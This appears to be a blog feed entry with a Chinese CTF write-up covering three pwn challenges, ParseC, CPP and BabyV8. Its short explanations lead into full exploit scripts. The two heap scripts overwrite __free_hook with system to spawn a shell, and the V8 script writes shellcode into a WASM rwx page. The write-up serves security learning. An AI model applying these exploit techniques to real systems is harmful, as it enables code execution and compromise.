    <updated>2020-12-16T13:02:31.093Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ParseC"><a href="#ParseC" class="headerlink" title="ParseC"></a>ParseC</h3><p>JIT类型题目。</p><p>有三个函数：read(读取浮点数)、puts（输出字符）、print（输出浮点数）</p><p>大体三种类型：浮点数/字符（存放在bss上）、数组（存放在堆中，只能放浮点数）、字符串（存放在堆中，每次重新赋值时若长度不同则会free后再malloc）。</p><p>字符串可以复制，并且堆上指针不变，因此存在UAF，可以进行double free。</p><p>首先填满tcache后用unsortbin进行leak操作。</p><p>接着double free一个0x20大小的堆块，修改其fd指向一同样double free了的0x50的堆块，修改0x50大小堆块的fd指向对应偏移0x28处（对应数组中存放了数值的地方）。</p><p>接着申请一个数组，输入16进制的<code>__free_hook-0x28</code>对应的浮点数。</p><p>接着申请两个数组，再进行输入，即可劫持<code>__free_hook</code>，修改其为system函数地址，接着free掉一个存放/bin/sh的堆块，即可getshell。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">//;/bin/sh</span></span><br><span class="line"><span class="string">//leak</span></span><br><span class="line"><span class="string">a = "22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222";</span></span><br><span class="line"><span class="string">b = "22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222";</span></span><br><span class="line"><span class="string">x1 = a;</span></span><br><span class="line"><span class="string">x2 = a;</span></span><br><span class="line"><span class="string">x3 = a;</span></span><br><span class="line"><span class="string">x4 = a;</span></span><br><span class="line"><span class="string">x5 = a;</span></span><br><span class="line"><span class="string">x6 = a;</span></span><br><span class="line"><span class="string">x7 = a;</span></span><br><span class="line"><span class="string">x8 = a;</span></span><br><span class="line"><span class="string">x1 = "222";</span></span><br><span class="line"><span class="string">x2 = "222";</span></span><br><span class="line"><span class="string">x3 = "222";</span></span><br><span class="line"><span class="string">x4 = "222";</span></span><br><span class="line"><span class="string">x5 = "222";</span></span><br><span class="line"><span class="string">x6 = "222";</span></span><br><span class="line"><span class="string">x7 = "222";</span></span><br><span class="line"><span class="string">x8 = "222";</span></span><br><span class="line"><span class="string">puts(x8);</span></span><br><span class="line"><span class="string">puts(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">q = "'''</span>+<span class="string">'a'</span>*<span class="number">0x38</span>+<span class="string">'''";</span></span><br><span class="line"><span class="string">x20 = q;</span></span><br><span class="line"><span class="string">x21 = q;</span></span><br><span class="line"><span class="string">x20 = "'''</span>+<span class="string">'a'</span>*<span class="number">0x98</span>+<span class="string">'''";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array c(1);</span></span><br><span class="line"><span class="string">read(v);</span></span><br><span class="line"><span class="string">c[0]=v;</span></span><br><span class="line"><span class="string">a = "1";</span></span><br><span class="line"><span class="string">d= "1";</span></span><br><span class="line"><span class="string">e = "        ;/bin/sh";</span></span><br><span class="line"><span class="string">x9 = d;</span></span><br><span class="line"><span class="string">x10 = d;</span></span><br><span class="line"><span class="string">x9= "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">x10= "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">f = "\x60";</span></span><br><span class="line"><span class="string">x21 = "'''</span>+<span class="string">'a'</span>*<span class="number">0x98</span>+<span class="string">'''";</span></span><br><span class="line"><span class="string">g = "\x60";</span></span><br><span class="line"><span class="string">k = "\x88";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array h(1);</span></span><br><span class="line"><span class="string">array j(1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array l(1);</span></span><br><span class="line"><span class="string">read(t);</span></span><br><span class="line"><span class="string">l[0]=t;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e = "111111111111111";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">f = open(<span class="string">'exp'</span>,<span class="string">'rb+'</span>)</span><br><span class="line">f.write(code)</span><br><span class="line">f.close()</span><br><span class="line">p = process([<span class="string">"./ParseC"</span>,<span class="string">"exp"</span>],env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line">code = base64.b64encode(code)</span><br><span class="line">p.sendline(code)</span><br><span class="line">p.recvuntil(<span class="string">"222\n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBca0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += a[<span class="number">14</span>:<span class="number">16</span>]</span><br><span class="line">s += a[<span class="number">12</span>:<span class="number">14</span>]</span><br><span class="line">s += a[<span class="number">10</span>:<span class="number">12</span>]</span><br><span class="line">s += a[<span class="number">8</span>:<span class="number">10</span>]</span><br><span class="line">s += a[<span class="number">6</span>:<span class="number">8</span>]</span><br><span class="line">s += a[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">s += a[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">s += a[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">free_hook = hex(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x28</span>)[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">"0"</span>)</span><br><span class="line">free_hook = rev(free_hook)</span><br><span class="line">free_hook = struct.unpack(<span class="string">'&lt;d'</span>, binascii.unhexlify(free_hook))</span><br><span class="line"></span><br><span class="line">system = hex(libc.sym[<span class="string">'system'</span>])[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">"0"</span>)</span><br><span class="line">print(system)</span><br><span class="line">system = rev(system)</span><br><span class="line">print(system)</span><br><span class="line">system = struct.unpack(<span class="string">'&lt;d'</span>, binascii.unhexlify(system))</span><br><span class="line">print(system)</span><br><span class="line"></span><br><span class="line">p.sendline(str(free_hook)[<span class="number">1</span>:<span class="number">-2</span>])</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x555555556262\nb *0x55555555627d\nb *0x55555555623d\n b free')</span></span><br><span class="line">p.sendline(str(system)[<span class="number">1</span>:<span class="number">-2</span>])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h3><p>c++的题目，静态分析有点困难，所以直接gdb看堆块变化。</p><p>分析发现free后未对堆指针置0，因而存在uaf漏洞。另外edit的时候会重新申请相应大小堆块。</p><p>首先double free掉0x20的堆块，并将fd修改为下面unsortbin堆块-0x10偏移处地址，方便后面进行io leak。</p><p>接着申请0x88大小的堆块，并先申请0x48大小的堆块，double free（修复后续申请堆块问题）。</p><p>接着申请0x98，防止unsortbin被合并到topchunk。</p><p>申请回0x88的堆块，将其free填满tcache即放入unsortbin，获得libc相应偏移的地址。</p><p>接着用上面0x20的堆块修改0x88堆块的fd，将其爆破到<code>_IO_2_1_stdout_-0x61</code>处，并将size修改为0x21，并修复bins结构。</p><p>接着构造payload进行ioleak，注意长度需要满足，这里用了<code>&#39;\xff&#39;*7+p64(0)*12+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;</code>。这样即可leak出libc地址。</p><p>接着double free，劫持<code>__free_hook</code>为system函数地址，再用edit输入shell命令：<code>&quot;/bin/sh&quot;.ljust(0x1f,&#39;\x00&#39;)+&#39;icqb8a2d9242a67b4510eacfe4635155&#39;</code>，操作中即会将该堆块free并输入token。（关于截取长度的问题，这里爆破了很久，最终确定是0x1f大小后接token就可以）。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout=<span class="number">1</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = process(<span class="string">"./cpp"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"[B]ye"</span>)</span><br><span class="line">p.sendline(<span class="string">"C"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"[B]ye"</span>)</span><br><span class="line">p.sendline(<span class="string">"W"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"[B]ye"</span>)</span><br><span class="line">p.sendline(<span class="string">"D"</span>)</span><br><span class="line">libc.address = <span class="number">0x00007ffff79e2000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>])</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x20</span>)</span><br><span class="line">add()</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">'\x90\xd1'</span>)</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x88</span>)</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x48</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x98</span>)</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free()</span><br><span class="line">add()</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'\xf9\xe6'</span>)</span><br><span class="line">edit(<span class="string">'\xff'</span>*<span class="number">7</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))<span class="number">-0x3EC700</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc\n b free')</span></span><br><span class="line">edit(<span class="string">"/bin/sh"</span>.ljust(<span class="number">0x1f</span>,<span class="string">'\x00'</span>)+<span class="string">'icqb8a2d9242a67b4510eacfe4635155'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fail"</span></span><br></pre></td></tr></table></figure><h3 id="BabyV8"><a href="#BabyV8" class="headerlink" title="BabyV8"></a>BabyV8</h3><p>对着官方exp撸了下，发现挺简单的，是一道类似于oob的题目，push、pop后会使数组越界溢出，就可以修改map属性和elements地址及长度，这样就可以做到任意读写了。在exp中搞了下注释，直接上代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//浮点数和整数互换</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    d2u(val)&#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2d(val)&#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    hex(val)&#123;</span><br><span class="line">        <span class="keyword">return</span> val.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br><span class="line"><span class="comment">//构造rwx段</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a1 = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//将f地址存入b中以方便读取</span></span><br><span class="line"><span class="keyword">var</span> b = [f,f];</span><br><span class="line"><span class="comment">//设置针对字节存储的数组</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"><span class="comment">//利用漏洞泄漏数组a1的地址</span></span><br><span class="line">a1.pop();</span><br><span class="line">a1.push(<span class="number">3.3</span>);</span><br><span class="line">a1_addr = mem.d2u(a1[<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"><span class="comment">//修改元素长度为0x100</span></span><br><span class="line">a1[<span class="number">4</span>] = mem.u2d(<span class="number">0x10000000000</span>+a1_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造泄漏函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak32</span>(<span class="params">addr, offset=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    a1[<span class="number">0xa</span>] = mem.u2d(<span class="number">0x10000000000</span>+addr);</span><br><span class="line">    <span class="comment">//print('0x' + mem.d2u(a[offset]).toString(16));</span></span><br><span class="line">    <span class="keyword">return</span> (mem.d2u(a[offset]) - (mem.d2u(a[offset]) &amp; <span class="number">0xFFFFFFFF</span>)) / <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak64</span>(<span class="params">addr, offset=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    a1[<span class="number">0xa</span>] = mem.u2d(<span class="number">0x10000000000</span>+addr);</span><br><span class="line">    <span class="comment">//print('0x' + mem.d2u(a[offset]).toString(16));</span></span><br><span class="line">    <span class="keyword">return</span> mem.d2u(a[offset]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//泄漏a数组地址</span></span><br><span class="line">a.pop(); </span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">a.push(<span class="number">3.3</span>);</span><br><span class="line">print(<span class="string">'0x'</span>+ mem.d2u(a[<span class="number">4</span>]).toString(<span class="number">16</span>));</span><br><span class="line">elements_addr = mem.d2u(a[<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">print(<span class="string">'elements addr: 0x'</span> + elements_addr.toString(<span class="number">16</span>));</span><br><span class="line">a[<span class="number">4</span>] = mem.u2d(<span class="number">0x10000000000</span>+elements_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取f的地址</span></span><br><span class="line">func_addr = (mem.d2u(a[<span class="number">0x6</span>]) - (mem.d2u(a[<span class="number">0x6</span>]) &amp; <span class="number">0xFFFFFFFF</span>)) / <span class="number">0x100000000</span>;</span><br><span class="line">print(<span class="string">'func_addr: 0x'</span>+ func_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//%SystemBreak();  </span></span><br><span class="line"><span class="comment">//leak rwx</span></span><br><span class="line"><span class="comment">//function_addr-&gt;shared_info_addr-&gt;WasmExportedFunctionData-&gt;instance_addr-&gt;rwx_addr</span></span><br><span class="line">shared_info_addr = leak32(func_addr);</span><br><span class="line">print(<span class="string">'shared_info_addr: 0x'</span> + shared_info_addr.toString(<span class="number">16</span>));</span><br><span class="line">WasmExportedFunctionData = leak32(shared_info_addr<span class="number">-8</span>);</span><br><span class="line">print(<span class="string">'WasmExportedFunctionData: 0x'</span> + WasmExportedFunctionData.toString(<span class="number">16</span>));</span><br><span class="line">instance_addr = leak32(WasmExportedFunctionData<span class="number">-0x4</span>);</span><br><span class="line">print(<span class="string">'instance_addr: 0x'</span> + instance_addr.toString(<span class="number">16</span>));</span><br><span class="line">rwx_addr = leak64(instance_addr+<span class="number">0x60</span>);</span><br><span class="line">print(<span class="string">'rwx_addr: 0x'</span> + rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//write backing store</span></span><br><span class="line"><span class="comment">//修改a的元素地址，并修改dv的操作地址为rwx段</span></span><br><span class="line">a1[<span class="number">0xa</span>] = mem.u2d(<span class="number">0x10000000000</span>+elements_addr+<span class="number">4</span>);</span><br><span class="line">a[<span class="number">0xb</span>] = mem.u2d(rwx_addr);</span><br><span class="line"><span class="comment">//let sc = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];</span></span><br><span class="line"><span class="comment">//orw</span></span><br><span class="line"><span class="keyword">let</span> sc = [<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">112</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt;sc.length; i++)&#123;</span><br><span class="line">    dv.setUint8(i, sc[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
